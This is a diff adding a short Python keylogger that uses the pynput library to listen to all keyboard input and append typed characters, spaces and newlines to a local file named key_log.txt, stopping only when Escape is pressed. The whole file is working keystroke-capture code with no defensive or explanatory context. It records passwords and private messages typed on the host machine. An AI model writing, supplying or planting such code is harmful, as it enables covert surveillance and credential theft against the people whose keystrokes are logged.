@@ -1,0 +1,31 @@
+from pynput.keyboard import Key, Listener
+
+# Specify the log file path
+log_file = "key_log.txt"
+
+# Function to write key press to log file
+def write_to_file(key):
+    with open(log_file, "a") as f:
+        # Remove quotes around keys for readability
+        k = str(key).replace("'", "")
+        if k == 'Key.space':
+            f.write(' ')  # Write a space when the spacebar is pressed
+        elif k == 'Key.enter':
+            f.write('\n')  # Write a newline when Enter is pressed
+        elif 'Key' not in k:
+            f.write(k)  # Write normal keys as they are
+        # Optionally log other keys like backspace, shift, etc.
+
+# Function that runs when a key is pressed
+def on_press(key):
+    write_to_file(key)
+
+# Function that runs when a key is released
+def on_release(key):
+    # Stop listener when escape key is pressed (optional)
+    if key == Key.esc:
+        return False
+
+# Setting up the listener to monitor key presses
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
